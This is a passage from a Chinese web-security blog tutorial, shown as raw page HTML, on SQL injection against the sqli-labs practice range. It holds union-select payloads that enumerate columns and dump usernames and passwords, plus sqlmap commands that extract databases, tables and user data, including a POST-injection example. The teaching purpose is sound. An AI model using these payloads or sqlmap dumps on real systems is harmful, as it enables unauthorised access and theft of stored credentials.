+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,COLUMN_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="s1">&#39; and TABLE_NAME=&#39;</span><span class="nx">users</span><span class="err">&#39;</span>  <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依次修改limit的值发现有这三个栏目：<code>id  username password</code></p>
+<h3 id="step7全部取出username及对应password">Step7：全部取出username及对应password
+</h3><p><strong>补充6：</strong></p>
+<p>使用<code>group_concat(栏目名)</code>可以取出对应栏目的所有数据</p>
+<hr>
+<h4 id="方法一group_concat语法">方法一：group_concat()语法
+</h4><p>传入以下参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="err">&#39;</span> <span class="nx">union</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">,</span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">username</span><span class="p">),</span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="nx">from</span> <span class="nx">users</span> <span class="o">--+</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回结果：</p>
+<p><img src="https://free.picui.cn/free/2025/11/28/69298f2006d9c.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>注：此方法在之前需要使用<code>limit</code>语法的地方也可尝试</p>
+<h4 id="方法二limit-ab-语法">方法二：limit a,b 语法
+</h4><p>适用情况：网站有输出长度限制</p>
+<p>与之前相同，在参数后面添加<code>limit 0,1</code>手动修改依次输出</p>
+<h2 id="工具辅助注入">工具辅助注入
+</h2><h3 id="sqlmap-用法使用kali版本">sqlmap 用法（使用Kali版本）
+</h3><p>慢速通用版：</p>
+<p>STEP1:<code>sqlmap -u [目标url] --dbs</code>也可使用<code>sqlmap -u [目标url] --current-db</code></p>
+<p>前者获取目标网站的所有库名，后者获取当前数据库名</p>
+<p>STEP2:<code>sqlmap -u [目标url] -D [库名] --tables</code></p>
+<p>获取指定库里的表</p>
+<p>STEP3:<code>sqlmap -u [目标url] -D [库名] -T [表名] --columns</code></p>
+<p>获取指定表里的栏目</p>
+<p>STEP4:<code>sqlmap -u [目标url] -D [库名] -T [表名] -C xxx,xxx --dump</code></p>
+<p>获取表里指定栏目的数据</p>
+<p>完毕</p>
+<p>快速版（也需要分步添加参数）：</p>
+<p><code>sqlmap -u [目标url] --dbs --batch --threads 10 --technique U</code></p>
+<p>使用sqlmap查看目标网站的数据库库名，忽略错误，开10线程，使用union select注入目标网站</p>
+<hr>
+<p><strong>补充：</strong></p>
+<p>&ndash;technique X 中后接参数的其他类型</p>
+<p>E = 报错注入 <em>error based</em>（无法发现报错位，但是数据库报错会出现）</p>
+<p>B = 布尔型注入 <em>booled based</em>（无法发现报错位，数据库闭合破坏也不出现，但是界面上只会出现<strong>有</strong>和<strong>没有</strong>东西两种情况）</p>
+<p>T = 布尔型时间盲注 <em>time based</em>（无法发现报错位，数据库闭合被破坏也不出现，界面上也没有出现消失东西的情况）</p>
+<h3 id="略微引申post类型的注入">略微引申：POST类型的注入
+</h3><p>以靶场<a class="link" href="http://sqlilabs.njhack.xyz/Less-11/index.php"  target="_blank" rel="noopener"
+    >http://sqlilabs.njhack.xyz/Less-11/index.php</a>为例</p>
+<p>STEP1：随便提交数据，使用burp suite抓包</p>
+<p>输入账号：admin1 密码：admin1</p>
+<p>抓包得到post内容<code>uname=admin1&amp;passwd=admin1&amp;submit=Submit</code></p>
+<p>STEP2：使用sqlmap注入</p>
+<p><code>sqlmap -u http://sqlilabs.njhack.xyz/Less-11/index.php --data &quot;uname=admin1*&amp;passwd=admin1&amp;submit=Submit&quot; --current-db --batch --threads 10 --technique U</code></p>
+<p><strong><font style="color:#DF2A3F;">注意：&ndash;data后跟着的</font></strong><code>&quot;&quot;</code><strong><font style="color:#DF2A3F;">包裹字符串内容要在打击处用</font></strong><code>*</code><strong><font style="color:#DF2A3F;">做标记</font></strong></p>
+<p>接下来的步骤略</p>
+<h2 id="拓展知识">拓展知识
+</h2><p>web渗透中目标不同的组合：</p>
+<p>Windows+iss+asp/aspx(asp.net)+access/mssql</p>
+<p>Windows+apache+php+mysql = wamp （一般使用软件进行集成化搭建）</p>
+<p>linux+apache/nginx+php+mysql = lamp/lnmp （又可能使用宝塔或其他面板搭建）</p>
+<p>linux+tomcat+java(jsp)+oracle/mysql</p>
+<p>linux+nginx+python(django/flask/tornado/fastapi)+go(beego/gin)+mysql</p>
+<hr>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+<div class="math-katex"></div>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/1.16-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.16 Linux应急响应</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.15 DOS补充和Win应急响应</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.14 自启动和DOS攻击初步</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.13  更多木马程序</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.12 进阶后门操作</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        <div class="comment-container mt-8"></div>
+        
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="makabaka11/makabaka11.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Retr0
+    </section>
+    
+    <section class="running-time">
+    已存在于互联网
+    <span id="runningdays" class="running-days"></span>
+    </section>
+    
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        发表了100篇文章 · 
+        总计142.78k字
+    </section>
+
+
+    <section class="powerby">
+        
+            Powered by ctOS <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+
+                <script src="/js/APlayer.min.js"></script>
+                <script src="/js/Meting.min.js"></script>
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eaf1211e4c7db355f37ceea53df13700e1b77fbcc3cfe8c1c1f69e4468a752e1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<link rel="stylesheet" href="/css/custom.css">
+
+<script>
+(function () {
+    const url = new URL(window.location.href);
+
+    
+    if (url.searchParams.has('utterances')) {
+
+        
+        
+        window.location.replace(window.location.pathname);
+    }
+})();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<script>
+    var pjax = new Pjax({
+        selectors: [".main-container"]
+    });
+</script>
+
+
+<script src=https://www.retr0.xyz/js/topbar.min.js></script>
+
+
+
+<script>
+function initUtterances() {
+    const isArticle = document.querySelector('.article-page') && document.querySelector('.article-content');
+    if (!isArticle) return;
+
+    const oldScript = document.querySelector('script[src^="https://utteranc.es/client.js"]');
+    if (oldScript) oldScript.remove();
+
+    const container = document.querySelector('.comment-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    let script = document.createElement('script');
+    script.src = 'https://utteranc.es/client.js';
+    script.setAttribute('repo', 'makabaka11/makabaka11.github.io');
+    script.setAttribute('issue-term', 'pathname');
+    script.setAttribute('crossorigin', 'anonymous');
+    script.async = true;
+    container.appendChild(script);
+}
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    if (!window.pjax || !window.pjax.state) initUtterances();
+});
+</script>
+
+
+<script>
+pjax._handleResponse = pjax.handleResponse;
+pjax.handleResponse = function(responseText, request, href, options) {
+    if (request.responseText.match("<html")) {
+        if (responseText) {
+            let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+            document.body.setAttribute("class", newDom.body.className);
+        }
+        pjax._handleResponse(responseText, request, href, options);
+    }
+};
+</script>
+
+
+<script>
+topbar.config({
+    barColors: {
+        '0': 'rgba(255, 255, 255, 1)',
+        '1.0': 'rgba(255, 183, 197, 1)'
+    }
+});
+
+document.addEventListener('pjax:send', () => topbar.show());
+
+document.addEventListener('pjax:complete', () => {
+    window.Stack.init();
+    topbar.hide();
+    setTimeout(initUtterances, 0);
+    updateViewCount();
+    renderKaTeX();
+    initPhotoSwipeFromDOM('.article-content');   
+    initLive2D();                                
+});
+</script>
+
+
+<script>
+function updateViewCount() {
+    const viewCountEl = document.getElementById('vercount_value_page_pv');
+    if (!viewCountEl) return;
+
+    viewCountEl.textContent = 'loading...';
+    const url = 'https://cn.vercount.one/js';
+
+    const old = document.querySelector(`script[src="${url}"]`);
+    if (old) old.remove();
+
+    const s = document.createElement('script');
+    s.src = url;
+    s.defer = true;
+    document.head.appendChild(s);
+
+    showHideView();
+}
+
+function showHideView() {
+    const viewCounts = document.querySelectorAll("#viewCount");
+    const isArticle = document.querySelector(".article-page");
+    viewCounts.forEach(ele => ele.style.display = isArticle ? 'block' : 'none');
+}
+</script>
+
+<script>
+    function showHideView() {
+        
+        let viewCounts = document.querySelectorAll("#viewCount");
+        if (viewCounts) {
+            
+            let article =  document.querySelector(".article-page");
+            if (!article) {
+                viewCounts.forEach(ele => {
+                    ele.style.display = 'none';
+                });
+            }
+        }
+    }
+    
+    showHideView();
+</script>
+
+
+
+<script>
+async function renderKaTeX() {
+    let katex = document.querySelector(".math-katex");
+    if (!katex) return;
+
+    while (typeof renderMathInElement !== 'function') {
+        await new Promise(r => setTimeout(r, 500));
+    }
+
+    const content = document.querySelector('.article-content') || document.body;
+    renderMathInElement(content, {
+        delimiters: [
+            { left: "$$", right: "$$", display: true },
+            { left: "$", right: "$", display: false },
+            { left: "\\(", right: "\\)", display: false },
+            { left: "\\[", right: "\\]", display: true }
+        ],
+        ignoredClasses: ["gist"]
+    });
+}
+</script>
+
+
+<div id="particles-js"></div>
+
+<script src=https://www.retr0.xyz/background/particles.min.js></script>
+<script>
+particlesJS.load('particles-js',
+    "https://www.retr0.xyz/background/particlesjs-config.json",
+    () => console.log('particles.js loaded')
+);
+</script>
+
+<style>
+#particles-js {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    z-index: -1;
+}
+</style>
+
+<script>
+
+function initPhotoSwipeFromDOM(selector) {
+    if (!window.PhotoSwipe) return;
+
+    const containers = document.querySelectorAll(selector);
+    if (!containers.length) return;
+
+    containers.forEach(container => {
+        const images = container.querySelectorAll('img');
+
+        images.forEach((img, index) => {
+
+            
+            function getImageSize() {
+                return new Promise(resolve => {
+                    if (img.complete && img.naturalWidth) {
+                        resolve({
+                            w: img.naturalWidth,
+                            h: img.naturalHeight
+                        });
+                    } else {
+                        const tmp = new Image();
+                        tmp.src = img.src || img.getAttribute("data-src");
+                        tmp.onload = () => resolve({ w: tmp.width, h: tmp.height });
+                    }
+                });
+            }
+
+            img.style.cursor = "zoom-in";
+
+            
+            img.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const size = await getImageSize();
+                const pswpEl = document.querySelector('.pswp');
+
+                const items = Array.from(images).map(i => ({
+                    src: i.src || i.getAttribute("data-src"),
+                    msrc: i.src,
+                    w: i.naturalWidth || 800,
+                    h: i.naturalHeight || 600,
+                }));
+
+                items[index].w = size.w;
+                items[index].h = size.h;
+
+                const gallery = new PhotoSwipe(pswpEl, PhotoSwipeUI_Default, items, {
+                    index,
+                    history: false
+                });
+
+                
+                
+                
+                enablePhotoSwipeWebShare(gallery);
+
+                gallery.init();
+            });
+        });
+    });
+}
+
+
+
+
+
+function enablePhotoSwipeWebShare(gallery) {
+    gallery.listen('shareLinkClick', function(shareButtonData, e) {
+        e.preventDefault();
+
+        const item = gallery.currItem;
+
+        if (navigator.share) {
+            navigator.share({
+                title: document.title,
+                text: '给你分享一张图片：',
+                url: item.src
+            }).catch(err => console.log("分享失败：", err));
+
+            return false; 
+        }
+
+        
+        return true;
+    });
+}
+</script>
+
+
+
+<script>
+
+
+window._live2d_loaded = window._live2d_loaded || false;
+window._live2d_initialized = window._live2d_initialized || false;
+
+
+function loadLive2DAssetsOnce(cdnPath) {
+    if (window._live2d_loaded) return Promise.resolve();
+
+    window._live2d_loaded = true;
+
+    return Promise.all([
+        loadRes(cdnPath + "waifu.css", "css"),
+        loadRes(cdnPath + "Core/live2dcubismcore.js", "js"),
+        loadRes(cdnPath + "live2d-sdk.js", "js"),
+        loadRes(cdnPath + "waifu-tips.js", "js")
+    ]);
+}
+
+
+function initLive2DWidgetOnce(cdnPath) {
+
+    if (window._live2d_initialized) return;
+
+    
+    const old = document.querySelector("#waifu");
+    if (old) old.remove();
+
+    window._live2d_initialized = true;
+
+    initWidget({
+        waifuPath: cdnPath + "waifu-tips.json",
+        cdnPath: cdnPath + "Resources/",
+        tools: ["hitokoto", "asteroids", "express", "switch-model", "switch-texture", "photo", "info", "quit"],
+        dragEnable: true,
+        dragDirection: ["x", "y"],
+        switchType: "order"
+    });
+
+    console.log("[Live2D] Widget initialized.");
+}
+
+
+function loadRes(url, type) {
+    return new Promise((resolve) => {
+        let tag;
+        if (type === "css") {
+            tag = document.createElement("link");
+            tag.rel = "stylesheet";
+            tag.href = url;
+        } else {
+            tag = document.createElement("script");
+            tag.src = url;
+        }
+        tag.onload = resolve;
+        document.head.appendChild(tag);
+    });
+}
+
+
+function initLive2D() {
+    if (screen.width < 768) return;
+
+    const cdnPath = "https://www.retr0.xyz/blog-live2d/";
+
+    loadLive2DAssetsOnce(cdnPath)
+        .then(() => initLive2DWidgetOnce(cdnPath));
+}
+
+initLive2D();  
+
+
+document.addEventListener("pjax:complete", () => {
+    initLive2D(); 
+});
+</script>
+
+
+<style>
+    .highlight {
+         
+        max-height: 400px;
+        overflow: hidden;
+        position: relative;  
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      const existingBox = codeBlock.querySelector('.code-more-box');
+      if (existingBox) existingBox.remove();
+
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://www.retr0.xyz/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+  
+  initCodeMoreBox();
+  
+  
+  document.addEventListener('pjax:complete', () => {
+    initCodeMoreBox();
+  });
+</script>
+
+
+<script>
+
+
+window.__articlePlayers = window.__articlePlayers || [];
+
+
+
+function getGlobalMetingPlayer() {
+    return window.__globalMetingPlayer || null;
+}
+
+
+
+function pauseGlobalMeting() {
+    const p = getGlobalMetingPlayer();
+    if (p && !p.audio.paused) {
+        p.pause();
+        console.log('[APlayer] Pause global Meting');
+    }
+}
+
+
+
+function pauseArticlePlayers() {
+    window.__articlePlayers.forEach(p => {
+        if (p && !p.audio.paused) {
+            p.pause();
+        }
+    });
+}
+
+
+
+function initAPlayers() {
+    if (typeof APlayer === "undefined") return;
+
+    document.querySelectorAll('.aplayer-article').forEach(el => {
+        if (el.dataset.loaded === "true") return;
+        el.dataset.loaded = "true";
+
+        const ap = new APlayer({
+            container: el,
+            fixed: false,
+            autoplay: false,
+            loop: 'none',
+            order: 'list',
+            preload: 'metadata',
+            volume: 0.7,
+            mutex: false, 
+            audio: [{
+                name: el.dataset.title || 'Unknown',
+                artist: el.dataset.artist || '',
+                url: el.dataset.src,
+                cover: el.dataset.cover || ''
+            }]
+        });
+
+        
+        ap.on('play', () => {
+            
+            pauseGlobalMeting();
+
+            
+            window.__articlePlayers.forEach(other => {
+                if (other !== ap && !other.audio.paused) {
+                    other.pause();
+                }
+            });
+
+    console.log('[APlayer] Switch article track');
+});
+
+
+        window.__articlePlayers.push(ap);
+    });
+}
+
+
+
+function bindMetingMutex() {
+    const p = getGlobalMetingPlayer();
+    if (!p || p.__mutexBound) return;
+
+    p.__mutexBound = true;
+
+    
+    p.on('play', () => {
+        pauseArticlePlayers();
+    });
+
+    console.log('[Meting] Mutex bound');
+}
+
+
+
+function initAllPlayers() {
+    initAPlayers();
+    bindMetingMutex();
+}
+
+
+
+document.addEventListener("DOMContentLoaded", initAllPlayers);
+document.addEventListener("pjax:complete", initAllPlayers);
+</script>
+
+<script>
+
+
+function destroyArticlePlayers() {
+    if (!window.__articlePlayers || window.__articlePlayers.length === 0) return;
+
+    window.__articlePlayers.forEach(ap => {
+        try {
+            if (!ap.audio.paused) {
+                ap.pause();
+            }
+            ap.destroy(); 
+        } catch (e) {
+            console.warn('[APlayer] destroy failed', e);
+        }
+    });
+
+    window.__articlePlayers = [];
+    console.log('[APlayer] Article players destroyed');
+}
+
+
+
+document.addEventListener('pjax:send', () => {
+    destroyArticlePlayers();
+});
+</script>
+
+
+<script>
+let runningTimeTimer = null;
+
+function updateRunningTime() {
+    const el = document.getElementById('runningdays');
+    if (!el) return;
+
+    let start = '2025-10-26 00:00:00'; 
+    start = new Date(start.replace(/-/g, "/"));
+    const now = new Date();
+
+    const diff = Math.floor((now.getTime() - start.getTime()) / 1000);
+
+    const days = Math.floor(diff / (24 * 3600));
+    const hours = Math.floor((diff % (24 * 3600)) / 3600);
+    const minutes = Math.floor((diff % 3600) / 60);
+    const seconds = diff % 60;
+
+    el.textContent =
+        `${days}天${hours}小时${minutes}分钟${seconds}秒`;
+}
+
+function initRunningTime() {
+    
+    updateRunningTime();
+
+    
+    if (runningTimeTimer) {
+        clearInterval(runningTimeTimer);
+    }
+
+    runningTimeTimer = setInterval(updateRunningTime, 1000);
+}
+
+ 
+document.addEventListener('DOMContentLoaded', () => {
+    initRunningTime();
+});
+
+ 
+document.addEventListener('pjax:complete', () => {
+    initRunningTime();
+});
+</script>
+
+
+
+
+
+
+
+
+
+        
+
+
+<meting-js
+  id="14477349320"
+  server="netease"
+  type="playlist"
+  fixed="true"
+  bottom="20px"
+  right="20px"
+  autoplay="false"
+  width="300px"
+  preload="metadata"
+  mutex="false">
+</meting-js>
+
+<script>
+(function () {
+
+  
+  if (window.__global_meting_initialized) return;
+  window.__global_meting_initialized = true;
+
+  const STORAGE_KEY = "playInfo";
+  const PLAYLIST_ID = "14477349320";
+
+  function initGlobalMeting() {
+    const meting = document.querySelector('meting-js');
+    if (!meting) return;
+
+    
+    meting.addEventListener('aplayer-loaded', () => {
+      const ap = meting.aplayer;
+      if (!ap) return;
+
+      
+      window.__globalMetingPlayer = ap;
+      console.log('[Meting] Global APlayer ready');
+
+      bindPlayerEvents(ap);
+      restorePlayState(ap);
+    }, { once: true });
+  }
+
+  function bindPlayerEvents(ap) {
+    
+    const save = () => savePlayState(ap);
+
+    window.addEventListener('beforeunload', save);
+    document.addEventListener('visibilitychange', save);
+
+    
+    ap.on('play', () => {
+      document.dispatchEvent(new CustomEvent('global-player-play'));
+    });
+  }
+
+  function savePlayState(ap) {
+    if (!ap || !ap.list || !ap.audio) return;
+
+    const data = {
+      playlistId: PLAYLIST_ID,
+      index: ap.list.index,
+      currentTime: ap.audio.currentTime,
+      paused: ap.paused
+    };
+
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+  }
+
+  function restorePlayState(ap) {
+    const data = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (!data || data.playlistId !== PLAYLIST_ID) return;
+
+    if (data.index < ap.list.songs.length) {
+      ap.list.switch(data.index);
+      ap.once('canplay', () => {
+        ap.seek(data.currentTime || 0);
+        if (!data.paused) {
+          ap.play().catch(() => {
+            ap.notice("点击继续播放", 3000);
+          });
+        }
+      });
+    }
+  }
+
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGlobalMeting);
+  } else {
+    initGlobalMeting();
+  }
+
+})();
+</script>
+
+    </body>
+</html>
